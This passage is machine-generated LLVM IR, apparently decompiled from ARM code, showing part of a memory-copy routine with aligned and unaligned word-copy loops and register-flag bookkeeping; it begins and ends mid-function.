  %v4_18bd8 = mul i32 %v11_18bbc, 16777216
  %v5_18bd8 = or i32 %v4_18bd8, %v3_18bd4
  store i32 %v5_18bd8, i32* @ip, align 4
  %v1_18bdc = inttoptr i32 %v0_18bdc to i32*
  store i32 %v5_18bc0, i32* %v1_18bdc, align 4
  %v3_18bdc = add i32 %v0_18bdc, 4
  %v4_18bdc = inttoptr i32 %v3_18bdc to i32*
  %v5_18bdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18bdc, i32* %v4_18bdc, align 4
  %v6_18bdc = add i32 %v0_18bdc, 8
  %v7_18bdc = inttoptr i32 %v6_18bdc to i32*
  %v8_18bdc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18bdc, i32* %v7_18bdc, align 4
  %v9_18bdc = add i32 %v0_18bdc, 12
  %v10_18bdc = inttoptr i32 %v9_18bdc to i32*
  %v11_18bdc = load i32, i32* @ip, align 4
  store i32 %v11_18bdc, i32* %v10_18bdc, align 4
  %v12_18bdc = add i32 %v0_18bdc, 16
  store i32 %v12_18bdc, i32* %r0.global-to-local, align 4
  %v0_18be0 = load i32, i32* %r2.global-to-local, align 4
  %v2_18be0 = add i32 %v0_18be0, -16
  store i32 %v2_18be0, i32* %r2.global-to-local, align 4
  %v6_18be4 = icmp slt i32 %v0_18be0, 16
  br i1 %v6_18be4, label %dec_label_pc_18be8, label %dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge

dec_label_pc_18bb8.dec_label_pc_18bb8_crit_edge:  ; preds = %dec_label_pc_18bb8
  %v0_18bb8.pre = load i32, i32* @lr, align 4
  %v0_18bbc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18bb8

dec_label_pc_18be8:                               ; preds = %dec_label_pc_18bb8
  %v2_18be8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18be8, i32* @r4, align 4
  %v5_18be8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18be8, i32* @r5, align 4
  %v2_18bec = add i32 %v0_18be0, -4
  store i32 %v2_18bec, i32* %r2.global-to-local, align 4
  %v4_18bec = add i32 %v0_18be0, 2147483632
  %v5_18bec = and i32 %v2_18bec, %v4_18bec
  %v6_18bec = icmp slt i32 %v5_18bec, 0
  store i1 %v6_18bec, i1* %cpsr_v.global-to-local, align 1
  %v7_18bec = icmp slt i32 %v2_18bec, 0
  store i1 %v7_18bec, i1* %cpsr_n.global-to-local, align 1
  %v5_18bf0 = icmp slt i32 %v2_18be0, -12
  br i1 %v5_18bf0, label %dec_label_pc_18c0c, label %dec_label_pc_18bf4

dec_label_pc_18bf4:                               ; preds = %dec_label_pc_18be8, %dec_label_pc_18ba8, %dec_label_pc_18bf4
  %v1_18c00 = phi i32 [ %v4_18c00, %dec_label_pc_18bf4 ], [ %v12_18bdc, %dec_label_pc_18be8 ], [ %v0_18bdc75, %dec_label_pc_18ba8 ]
  %v0_18bf4 = load i32, i32* @lr, align 4
  %v3_18bf4 = udiv i32 %v0_18bf4, 256
  store i32 %v3_18bf4, i32* %ip.global-to-local, align 4
  %v0_18bf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18bf8 = inttoptr i32 %v0_18bf8 to i32*
  %v2_18bf8 = load i32, i32* %v1_18bf8, align 4
  store i32 %v2_18bf8, i32* @lr, align 4
  %v4_18bf8 = add i32 %v0_18bf8, 4
  store i32 %v4_18bf8, i32* %r1.global-to-local, align 4
  %v4_18bfc = mul i32 %v2_18bf8, 16777216
  %v5_18bfc = or i32 %v4_18bfc, %v3_18bf4
  store i32 %v5_18bfc, i32* @ip, align 4
  %v2_18c00 = inttoptr i32 %v1_18c00 to i32*
  store i32 %v5_18bfc, i32* %v2_18c00, align 4
  %v3_18c00 = load i32, i32* %r0.global-to-local, align 4
  %v4_18c00 = add i32 %v3_18c00, 4
  store i32 %v4_18c00, i32* %r0.global-to-local, align 4
  %v0_18c04 = load i32, i32* %r2.global-to-local, align 4
  %v2_18c04 = add i32 %v0_18c04, -4
  store i32 %v2_18c04, i32* %r2.global-to-local, align 4
  %v6_18c08 = icmp slt i32 %v0_18c04, 4
  br i1 %v6_18c08, label %dec_label_pc_18c0c.loopexit, label %dec_label_pc_18bf4

dec_label_pc_18c0c.loopexit:                      ; preds = %dec_label_pc_18bf4
  %v4_18c04 = sub i32 3, %v0_18c04
  %v5_18c04 = and i32 %v4_18c04, %v0_18c04
  %v6_18c04 = icmp slt i32 %v5_18c04, 0
  %v7_18c04 = icmp slt i32 %v2_18c04, 0
  store i1 %v6_18c04, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18c04, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18c0c

dec_label_pc_18c0c:                               ; preds = %dec_label_pc_18c0c.loopexit, %dec_label_pc_18be8
  %v2_18b4c113 = phi i32 [ %v4_18c00, %dec_label_pc_18c0c.loopexit ], [ %v12_18bdc, %dec_label_pc_18be8 ]
  %v0_18b3c109 = phi i32 [ %v2_18c04, %dec_label_pc_18c0c.loopexit ], [ %v2_18bec, %dec_label_pc_18be8 ]
  %v0_18c0c = load i32, i32* %r1.global-to-local, align 4
  %v1_18c0c = add i32 %v0_18c0c, -3
  store i32 %v1_18c0c, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_18c14:                               ; preds = %dec_label_pc_18b94
  br i1 %v5_18c84, label %dec_label_pc_18c60, label %dec_label_pc_18c1c

dec_label_pc_18c1c:                               ; preds = %dec_label_pc_18c14
  store i32 %v2_18c80, i32* %r2.global-to-local, align 4
  %v3_18c20 = load i32, i32* @r4, align 4
  store i32 %v3_18c20, i32* %stack_var_-16, align 4
  %v6_18c20 = load i32, i32* @r5, align 4
  store i32 %v6_18c20, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18c24

dec_label_pc_18c24:                               ; preds = %dec_label_pc_18c24.dec_label_pc_18c24_crit_edge, %dec_label_pc_18c1c
  %v0_18c48 = phi i32 [ %v12_18c48, %dec_label_pc_18c24.dec_label_pc_18c24_crit_edge ], [ %v0_18bdc75, %dec_label_pc_18c1c ]
  %v0_18c28 = phi i32 [ %v0_18c28.pre, %dec_label_pc_18c24.dec_label_pc_18c24_crit_edge ], [ %v4_18b98, %dec_label_pc_18c1c ]
  %v0_18c24 = phi i32 [ %v0_18c24.pre, %dec_label_pc_18c24.dec_label_pc_18c24_crit_edge ], [ %v2_18b98, %dec_label_pc_18c1c ]
  %v3_18c24 = udiv i32 %v0_18c24, 65536
  store i32 %v3_18c24, i32* %r3.global-to-local, align 4
  %v1_18c28 = inttoptr i32 %v0_18c28 to i32*
  %v2_18c28 = load i32, i32* %v1_18c28, align 4
  store i32 %v2_18c28, i32* %r4.global-to-local, align 4
  %v3_18c28 = add i32 %v0_18c28, 4
  %v4_18c28 = inttoptr i32 %v3_18c28 to i32*
  %v5_18c28 = load i32, i32* %v4_18c28, align 4
  store i32 %v5_18c28, i32* %r5.global-to-local, align 4
  %v6_18c28 = add i32 %v0_18c28, 8
  %v7_18c28 = inttoptr i32 %v6_18c28 to i32*
  %v8_18c28 = load i32, i32* %v7_18c28, align 4
  store i32 %v8_18c28, i32* %ip.global-to-local, align 4
  %v9_18c28 = add i32 %v0_18c28, 12
  %v10_18c28 = inttoptr i32 %v9_18c28 to i32*
  %v11_18c28 = load i32, i32* %v10_18c28, align 4
  store i32 %v11_18c28, i32* @lr, align 4
  %v12_18c28 = add i32 %v0_18c28, 16
  store i32 %v12_18c28, i32* %r1.global-to-local, align 4
  %v4_18c2c = mul i32 %v2_18c28, 65536
  %v5_18c2c = or i32 %v4_18c2c, %v3_18c24
  store i32 %v5_18c2c, i32* %r3.global-to-local, align 4
  %v3_18c30 = udiv i32 %v2_18c28, 65536
  %v4_18c34 = mul i32 %v5_18c28, 65536
  %v5_18c34 = or i32 %v4_18c34, %v3_18c30
  store i32 %v5_18c34, i32* %r4.global-to-local, align 4
  %v3_18c38 = udiv i32 %v5_18c28, 65536
  %v4_18c3c = mul i32 %v8_18c28, 65536
  %v5_18c3c = or i32 %v4_18c3c, %v3_18c38
  store i32 %v5_18c3c, i32* %r5.global-to-local, align 4
  %v3_18c40 = udiv i32 %v8_18c28, 65536
  %v4_18c44 = mul i32 %v11_18c28, 65536
  %v5_18c44 = or i32 %v4_18c44, %v3_18c40
  store i32 %v5_18c44, i32* @ip, align 4
  %v1_18c48 = inttoptr i32 %v0_18c48 to i32*
  store i32 %v5_18c2c, i32* %v1_18c48, align 4
  %v3_18c48 = add i32 %v0_18c48, 4
  %v4_18c48 = inttoptr i32 %v3_18c48 to i32*
  %v5_18c48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18c48, i32* %v4_18c48, align 4
  %v6_18c48 = add i32 %v0_18c48, 8
  %v7_18c48 = inttoptr i32 %v6_18c48 to i32*
  %v8_18c48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18c48, i32* %v7_18c48, align 4
  %v9_18c48 = add i32 %v0_18c48, 12
  %v10_18c48 = inttoptr i32 %v9_18c48 to i32*
  %v11_18c48 = load i32, i32* @ip, align 4
  store i32 %v11_18c48, i32* %v10_18c48, align 4
  %v12_18c48 = add i32 %v0_18c48, 16
  store i32 %v12_18c48, i32* %r0.global-to-local, align 4
  %v0_18c4c = load i32, i32* %r2.global-to-local, align 4
  %v2_18c4c = add i32 %v0_18c4c, -16
  store i32 %v2_18c4c, i32* %r2.global-to-local, align 4
  %v6_18c50 = icmp slt i32 %v0_18c4c, 16
  br i1 %v6_18c50, label %dec_label_pc_18c54, label %dec_label_pc_18c24.dec_label_pc_18c24_crit_edge

dec_label_pc_18c24.dec_label_pc_18c24_crit_edge:  ; preds = %dec_label_pc_18c24
  %v0_18c24.pre = load i32, i32* @lr, align 4
  %v0_18c28.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18c24

dec_label_pc_18c54:                               ; preds = %dec_label_pc_18c24
  %v2_18c54 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18c54, i32* @r4, align 4
  %v5_18c54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18c54, i32* @r5, align 4
  %v2_18c58 = add i32 %v0_18c4c, -4
  store i32 %v2_18c58, i32* %r2.global-to-local, align 4
  %v4_18c58 = add i32 %v0_18c4c, 2147483632
  %v5_18c58 = and i32 %v2_18c58, %v4_18c58
  %v6_18c58 = icmp slt i32 %v5_18c58, 0
  store i1 %v6_18c58, i1* %cpsr_v.global-to-local, align 1
  %v7_18c58 = icmp slt i32 %v2_18c58, 0
  store i1 %v7_18c58, i1* %cpsr_n.global-to-local, align 1
  %v5_18c5c = icmp slt i32 %v2_18c4c, -12
  br i1 %v5_18c5c, label %dec_label_pc_18c78, label %dec_label_pc_18c60

dec_label_pc_18c60:                               ; preds = %dec_label_pc_18c54, %dec_label_pc_18c14, %dec_label_pc_18c60
  %v1_18c6c = phi i32 [ %v4_18c6c, %dec_label_pc_18c60 ], [ %v12_18c48, %dec_label_pc_18c54 ], [ %v0_18bdc75, %dec_label_pc_18c14 ]
  %v0_18c60 = load i32, i32* @lr, align 4
  %v3_18c60 = udiv i32 %v0_18c60, 65536
  store i32 %v3_18c60, i32* %ip.global-to-local, align 4
  %v0_18c64 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c64 = inttoptr i32 %v0_18c64 to i32*
  %v2_18c64 = load i32, i32* %v1_18c64, align 4
  store i32 %v2_18c64, i32* @lr, align 4
  %v4_18c64 = add i32 %v0_18c64, 4
  store i32 %v4_18c64, i32* %r1.global-to-local, align 4
  %v4_18c68 = mul i32 %v2_18c64, 65536
  %v5_18c68 = or i32 %v4_18c68, %v3_18c60
  store i32 %v5_18c68, i32* @ip, align 4
  %v2_18c6c = inttoptr i32 %v1_18c6c to i32*
  store i32 %v5_18c68, i32* %v2_18c6c, align 4
  %v3_18c6c = load i32, i32* %r0.global-to-local, align 4
  %v4_18c6c = add i32 %v3_18c6c, 4
  store i32 %v4_18c6c, i32* %r0.global-to-local, align 4
  %v0_18c70 = load i32, i32* %r2.global-to-local, align 4
  %v2_18c70 = add i32 %v0_18c70, -4
  store i32 %v2_18c70, i32* %r2.global-to-local, align 4
  %v6_18c74 = icmp slt i32 %v0_18c70, 4
  br i1 %v6_18c74, label %dec_label_pc_18c78.loopexit, label %dec_label_pc_18c60

dec_label_pc_18c78.loopexit:                      ; preds = %dec_label_pc_18c60
  %v4_18c70 = sub i32 3, %v0_18c70
  %v5_18c70 = and i32 %v4_18c70, %v0_18c70
  %v6_18c70 = icmp slt i32 %v5_18c70, 0
  %v7_18c70 = icmp slt i32 %v2_18c70, 0
  store i1 %v6_18c70, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18c70, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %dec_label_pc_18c78.loopexit, %dec_label_pc_18c54
  %v2_18b4c112 = phi i32 [ %v4_18c6c, %dec_label_pc_18c78.loopexit ], [ %v12_18c48, %dec_label_pc_18c54 ]
  %v0_18b3c108 = phi i32 [ %v2_18c70, %dec_label_pc_18c78.loopexit ], [ %v2_18c58, %dec_label_pc_18c54 ]
  %v0_18c78 = load i32, i32* %r1.global-to-local, align 4
  %v1_18c78 = add i32 %v0_18c78, -2
  store i32 %v1_18c78, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_18c80:                               ; preds = %dec_label_pc_18b94
  br i1 %v5_18c84, label %dec_label_pc_18ccc, label %dec_label_pc_18c88

dec_label_pc_18c88:                               ; preds = %dec_label_pc_18c80
  store i32 %v2_18c80, i32* %r2.global-to-local, align 4
  %v3_18c8c = load i32, i32* @r4, align 4
  store i32 %v3_18c8c, i32* %stack_var_-16, align 4
  %v6_18c8c = load i32, i32* @r5, align 4
  store i32 %v6_18c8c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18c90

dec_label_pc_18c90:                               ; preds = %dec_label_pc_18c90.dec_label_pc_18c90_crit_edge, %dec_label_pc_18c88
  %v0_18cb4 = phi i32 [ %v12_18cb4, %dec_label_pc_18c90.dec_label_pc_18c90_crit_edge ], [ %v0_18bdc75, %dec_label_pc_18c88 ]
  %v0_18c94 = phi i32 [ %v0_18c94.pre, %dec_label_pc_18c90.dec_label_pc_18c90_crit_edge ], [ %v4_18b98, %dec_label_pc_18c88 ]
  %v0_18c90 = phi i32 [ %v0_18c90.pre, %dec_label_pc_18c90.dec_label_pc_18c90_crit_edge ], [ %v2_18b98, %dec_label_pc_18c88 ]
  %v3_18c90 = udiv i32 %v0_18c90, 16777216
  store i32 %v3_18c90, i32* %r3.global-to-local, align 4
  %v1_18c94 = inttoptr i32 %v0_18c94 to i32*
  %v2_18c94 = load i32, i32* %v1_18c94, align 4
  store i32 %v2_18c94, i32* %r4.global-to-local, align 4
  %v3_18c94 = add i32 %v0_18c94, 4
  %v4_18c94 = inttoptr i32 %v3_18c94 to i32*
  %v5_18c94 = load i32, i32* %v4_18c94, align 4
  store i32 %v5_18c94, i32* %r5.global-to-local, align 4
  %v6_18c94 = add i32 %v0_18c94, 8
  %v7_18c94 = inttoptr i32 %v6_18c94 to i32*
  %v8_18c94 = load i32, i32* %v7_18c94, align 4
  store i32 %v8_18c94, i32* %ip.global-to-local, align 4
  %v9_18c94 = add i32 %v0_18c94, 12
  %v10_18c94 = inttoptr i32 %v9_18c94 to i32*
  %v11_18c94 = load i32, i32* %v10_18c94, align 4
  store i32 %v11_18c94, i32* @lr, align 4
  %v12_18c94 = add i32 %v0_18c94, 16
  store i32 %v12_18c94, i32* %r1.global-to-local, align 4
  %v4_18c98 = mul i32 %v2_18c94, 256
  %v5_18c98 = or i32 %v4_18c98, %v3_18c90
  store i32 %v5_18c98, i32* %r3.global-to-local, align 4
  %v3_18c9c = udiv i32 %v2_18c94, 16777216
  %v4_18ca0 = mul i32 %v5_18c94, 256
  %v5_18ca0 = or i32 %v4_18ca0, %v3_18c9c
  store i32 %v5_18ca0, i32* %r4.global-to-local, align 4
  %v3_18ca4 = udiv i32 %v5_18c94, 16777216
  %v4_18ca8 = mul i32 %v8_18c94, 256
  %v5_18ca8 = or i32 %v4_18ca8, %v3_18ca4
  store i32 %v5_18ca8, i32* %r5.global-to-local, align 4
  %v3_18cac = udiv i32 %v8_18c94, 16777216
  %v4_18cb0 = mul i32 %v11_18c94, 256
  %v5_18cb0 = or i32 %v4_18cb0, %v3_18cac
  store i32 %v5_18cb0, i32* @ip, align 4
  %v1_18cb4 = inttoptr i32 %v0_18cb4 to i32*
  store i32 %v5_18c98, i32* %v1_18cb4, align 4
  %v3_18cb4 = add i32 %v0_18cb4, 4
  %v4_18cb4 = inttoptr i32 %v3_18cb4 to i32*
  %v5_18cb4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18cb4, i32* %v4_18cb4, align 4
  %v6_18cb4 = add i32 %v0_18cb4, 8
  %v7_18cb4 = inttoptr i32 %v6_18cb4 to i32*
  %v8_18cb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18cb4, i32* %v7_18cb4, align 4
  %v9_18cb4 = add i32 %v0_18cb4, 12
  %v10_18cb4 = inttoptr i32 %v9_18cb4 to i32*
  %v11_18cb4 = load i32, i32* @ip, align 4
  store i32 %v11_18cb4, i32* %v10_18cb4, align 4
  %v12_18cb4 = add i32 %v0_18cb4, 16
  store i32 %v12_18cb4, i32* %r0.global-to-local, align 4
  %v0_18cb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_18cb8 = add i32 %v0_18cb8, -16
  store i32 %v2_18cb8, i32* %r2.global-to-local, align 4
  %v6_18cbc = icmp slt i32 %v0_18cb8, 16
  br i1 %v6_18cbc, label %dec_label_pc_18cc0, label %dec_label_pc_18c90.dec_label_pc_18c90_crit_edge

dec_label_pc_18c90.dec_label_pc_18c90_crit_edge:  ; preds = %dec_label_pc_18c90
  %v0_18c90.pre = load i32, i32* @lr, align 4
  %v0_18c94.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18c90

dec_label_pc_18cc0:                               ; preds = %dec_label_pc_18c90
  %v2_18cc0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18cc0, i32* @r4, align 4
  %v5_18cc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18cc0, i32* @r5, align 4
  %v2_18cc4 = add i32 %v0_18cb8, -4
  store i32 %v2_18cc4, i32* %r2.global-to-local, align 4
  %v4_18cc4 = add i32 %v0_18cb8, 2147483632
  %v5_18cc4 = and i32 %v2_18cc4, %v4_18cc4
  %v6_18cc4 = icmp slt i32 %v5_18cc4, 0
  store i1 %v6_18cc4, i1* %cpsr_v.global-to-local, align 1
  %v7_18cc4 = icmp slt i32 %v2_18cc4, 0
  store i1 %v7_18cc4, i1* %cpsr_n.global-to-local, align 1
  %v5_18cc8 = icmp slt i32 %v2_18cb8, -12
  br i1 %v5_18cc8, label %dec_label_pc_18ce4, label %dec_label_pc_18ccc

dec_label_pc_18ccc:                               ; preds = %dec_label_pc_18cc0, %dec_label_pc_18c80, %dec_label_pc_18ccc
  %v1_18cd8 = phi i32 [ %v4_18cd8, %dec_label_pc_18ccc ], [ %v12_18cb4, %dec_label_pc_18cc0 ], [ %v0_18bdc75, %dec_label_pc_18c80 ]
  %v0_18ccc = load i32, i32* @lr, align 4
  %v3_18ccc = udiv i32 %v0_18ccc, 16777216
  store i32 %v3_18ccc, i32* %ip.global-to-local, align 4
  %v0_18cd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18cd0 = inttoptr i32 %v0_18cd0 to i32*
  %v2_18cd0 = load i32, i32* %v1_18cd0, align 4
  store i32 %v2_18cd0, i32* @lr, align 4
  %v4_18cd0 = add i32 %v0_18cd0, 4
  store i32 %v4_18cd0, i32* %r1.global-to-local, align 4
  %v4_18cd4 = mul i32 %v2_18cd0, 256
  %v5_18cd4 = or i32 %v4_18cd4, %v3_18ccc
  store i32 %v5_18cd4, i32* @ip, align 4
  %v2_18cd8 = inttoptr i32 %v1_18cd8 to i32*
  store i32 %v5_18cd4, i32* %v2_18cd8, align 4
  %v3_18cd8 = load i32, i32* %r0.global-to-local, align 4
  %v4_18cd8 = add i32 %v3_18cd8, 4
  store i32 %v4_18cd8, i32* %r0.global-to-local, align 4
  %v0_18cdc = load i32, i32* %r2.global-to-local, align 4
  %v2_18cdc = add i32 %v0_18cdc, -4
  store i32 %v2_18cdc, i32* %r2.global-to-local, align 4
  %v6_18ce0 = icmp slt i32 %v0_18cdc, 4
  br i1 %v6_18ce0, label %dec_label_pc_18ce4.loopexit, label %dec_label_pc_18ccc

dec_label_pc_18ce4.loopexit:                      ; preds = %dec_label_pc_18ccc
  %v4_18cdc = sub i32 3, %v0_18cdc
  %v5_18cdc = and i32 %v4_18cdc, %v0_18cdc
  %v6_18cdc = icmp slt i32 %v5_18cdc, 0
  %v7_18cdc = icmp slt i32 %v2_18cdc, 0
  store i1 %v6_18cdc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18cdc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18ce4

dec_label_pc_18ce4:                               ; preds = %dec_label_pc_18ce4.loopexit, %dec_label_pc_18cc0
  %v2_18b4c114 = phi i32 [ %v4_18cd8, %dec_label_pc_18ce4.loopexit ], [ %v12_18cb4, %dec_label_pc_18cc0 ]
  %v0_18b3c110 = phi i32 [ %v2_18cdc, %dec_label_pc_18ce4.loopexit ], [ %v2_18cc4, %dec_label_pc_18cc0 ]
  %v0_18ce4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ce4 = add i32 %v0_18ce4, -1
  store i32 %v1_18ce4, i32* %r1.global-to-local, align 4
  br label %bb133

dec_label_pc_18cec:                               ; preds = %entry
  %v1_18cec = load i32, i32* @r2, align 4
  %v2_18cec = add i32 %v1_18cec, %v0_18aa0
  store i32 %v2_18cec, i32* %r1.global-to-local, align 4
  %v2_18cf0 = add i32 %v1_18cec, %v1_18aa0
  store i32 %v2_18cf0, i32* %r0.global-to-local, align 4
  %v2_18cf4 = add i32 %v1_18cec, -4
  store i32 %v2_18cf4, i32* %r2.global-to-local, align 4
  %v4_18cf4 = sub i32 3, %v1_18cec
  %v5_18cf4 = and i32 %v4_18cf4, %v1_18cec
  %v6_18cf4 = icmp slt i32 %v5_18cf4, 0
  store i1 %v6_18cf4, i1* %cpsr_v.global-to-local, align 1
  %v7_18cf4 = icmp slt i32 %v2_18cf4, 0
  store i1 %v7_18cf4, i1* %cpsr_n.global-to-local, align 1
  %v5_18cf8 = icmp slt i32 %v1_18cec, 4
  br i1 %v5_18cf8, label %bb143, label %dec_label_pc_18cfc

dec_label_pc_18cfc:                               ; preds = %dec_label_pc_18cec
  %v1_18cfc = urem i32 %v2_18cf0, 4
  store i32 %v1_18cfc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18cfc = icmp eq i32 %v1_18cfc, 0
  br i1 %v2_18cfc, label %dec_label_pc_18d04, label %dec_label_pc_18da4

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18cfc
  %v1_18d04 = urem i32 %v2_18cec, 4
  store i32 %v1_18d04, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18d04 = icmp eq i32 %v1_18d04, 0
  br i1 %v2_18d04, label %dec_label_pc_18d0c, label %dec_label_pc_18dd0

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18d04, %dec_label_pc_18dc8
  %v0_18d2449 = phi i32 [ %v2_18cf0, %dec_label_pc_18d04 ], [ %v0_18e1832, %dec_label_pc_18dc8 ]
  %v0_18d2048 = phi i32 [ %v2_18cec, %dec_label_pc_18d04 ], [ %v0_18dc8, %dec_label_pc_18dc8 ]
  %v0_18d0c = phi i32 [ %v2_18cf4, %dec_label_pc_18d04 ], [ %v2_18dc0, %dec_label_pc_18dc8 ]
  %v2_18d0c = add i32 %v0_18d0c, -8
  store i32 %v2_18d0c, i32* %r2.global-to-local, align 4
  %v4_18d0c = sub i32 7, %v0_18d0c
  %v5_18d0c = and i32 %v4_18d0c, %v0_18d0c
  %v6_18d0c = icmp slt i32 %v5_18d0c, 0
  store i1 %v6_18d0c, i1* %cpsr_v.global-to-local, align 1
  %v7_18d0c = icmp slt i32 %v2_18d0c, 0
  store i1 %v7_18d0c, i1* %cpsr_n.global-to-local, align 1
  %v5_18d10 = icmp slt i32 %v0_18d0c, 8
  br i1 %v5_18d10, label %dec_label_pc_18d5c, label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18d0c
  %v3_18d14 = load i32, i32* @r4, align 4
  %v5_18d14 = inttoptr i32 %v3_18d14 to i8*
  store i8* %v5_18d14, i8** %stack_var_-8, align 4
  %v8_18d14 = load i32, i32* @lr, align 4
  %v2_18d18 = add i32 %v0_18d0c, -28
  store i32 %v2_18d18, i32* %r2.global-to-local, align 4
  %v4_18d18 = sub i32 27, %v0_18d0c
  %v5_18d18 = and i32 %v4_18d18, %v2_18d0c
  %v6_18d18 = icmp slt i32 %v5_18d18, 0
  store i1 %v6_18d18, i1* %cpsr_v.global-to-local, align 1
  %v7_18d18 = icmp slt i32 %v2_18d18, 0
  store i1 %v7_18d18, i1* %cpsr_n.global-to-local, align 1
  %v5_18d1c = icmp slt i32 %v2_18d0c, 20
  br i1 %v5_18d1c, label %dec_label_pc_18d38, label %dec_label_pc_18d20

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d14, %dec_label_pc_18d20.dec_label_pc_18d20_crit_edge
  %v0_18d24 = phi i32 [ %v1_18d2c, %dec_label_pc_18d20.dec_label_pc_18d20_crit_edge ], [ %v0_18d2449, %dec_label_pc_18d14 ]
  %v0_18d20 = phi i32 [ %v0_18d20.pre, %dec_label_pc_18d20.dec_label_pc_18d20_crit_edge ], [ %v0_18d2048, %dec_label_pc_18d14 ]
  %v1_18d20 = add i32 %v0_18d20, -4
  %v2_18d20 = inttoptr i32 %v1_18d20 to i32*
  %v3_18d20 = load i32, i32* %v2_18d20, align 4
  store i32 %v3_18d20, i32* %r3.global-to-local, align 4
  %v4_18d20 = add i32 %v0_18d20, -8
  %v5_18d20 = inttoptr i32 %v4_18d20 to i32*
  %v6_18d20 = load i32, i32* %v5_18d20, align 4
  store i32 %v6_18d20, i32* %r4.global-to-local, align 4
  %v7_18d20 = add i32 %v0_18d20, -12
  %v8_18d20 = inttoptr i32 %v7_18d20 to i32*
  %v9_18d20 = load i32, i32* %v8_18d20, align 4
  store i32 %v9_18d20, i32* %ip.global-to-local, align 4
  %v10_18d20 = add i32 %v0_18d20, -16
  %v11_18d20 = inttoptr i32 %v10_18d20 to i32*
  %v12_18d20 = load i32, i32* %v11_18d20, align 4
  store i32 %v12_18d20, i32* %lr.global-to-local, align 4
  store i32 %v10_18d20, i32* %r1.global-to-local, align 4
  %v1_18d24 = add i32 %v0_18d24, -16
  %v2_18d24 = inttoptr i32 %v1_18d24 to i32*
  store i32 %v3_18d20, i32* %v2_18d24, align 4
  %v4_18d24 = add i32 %v0_18d24, -12
  %v5_18d24 = inttoptr i32 %v4_18d24 to i32*
  %v6_18d24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18d24, i32* %v5_18d24, align 4
  %v7_18d24 = add i32 %v0_18d24, -8
  %v8_18d24 = inttoptr i32 %v7_18d24 to i32*
  %v9_18d24 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18d24, i32* %v8_18d24, align 4
  %v10_18d24 = add i32 %v0_18d24, -4
  %v11_18d24 = inttoptr i32 %v10_18d24 to i32*
  %v12_18d24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18d24, i32* %v11_18d24, align 4
  store i32 %v1_18d24, i32* %r0.global-to-local, align 4
  %v0_18d28 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d28 = add i32 %v0_18d28, -4
  %v2_18d28 = inttoptr i32 %v1_18d28 to i32*
  %v3_18d28 = load i32, i32* %v2_18d28, align 4
  store i32 %v3_18d28, i32* %r3.global-to-local, align 4
  %v4_18d28 = add i32 %v0_18d28, -8
  %v5_18d28 = inttoptr i32 %v4_18d28 to i32*
  %v6_18d28 = load i32, i32* %v5_18d28, align 4
  store i32 %v6_18d28, i32* %r4.global-to-local, align 4
  %v7_18d28 = add i32 %v0_18d28, -12
  %v8_18d28 = inttoptr i32 %v7_18d28 to i32*
  %v9_18d28 = load i32, i32* %v8_18d28, align 4
  store i32 %v9_18d28, i32* @ip, align 4
  %v10_18d28 = add i32 %v0_18d28, -16
  %v11_18d28 = inttoptr i32 %v10_18d28 to i32*
  %v12_18d28 = load i32, i32* %v11_18d28, align 4
  store i32 %v12_18d28, i32* %lr.global-to-local, align 4
  store i32 %v10_18d28, i32* %r1.global-to-local, align 4
  %v1_18d2c = add i32 %v0_18d24, -32
  %v2_18d2c = inttoptr i32 %v1_18d2c to i32*
  store i32 %v3_18d28, i32* %v2_18d2c, align 4
  %v4_18d2c = add i32 %v0_18d24, -28
  %v5_18d2c = inttoptr i32 %v4_18d2c to i32*
  %v6_18d2c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18d2c, i32* %v5_18d2c, align 4
  %v7_18d2c = add i32 %v0_18d24, -24
  %v8_18d2c = inttoptr i32 %v7_18d2c to i32*
  %v9_18d2c = load i32, i32* @ip, align 4
  store i32 %v9_18d2c, i32* %v8_18d2c, align 4
  %v10_18d2c = add i32 %v0_18d24, -20
  %v11_18d2c = inttoptr i32 %v10_18d2c to i32*
  %v12_18d2c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18d2c, i32* %v11_18d2c, align 4
  store i32 %v1_18d2c, i32* %r0.global-to-local, align 4
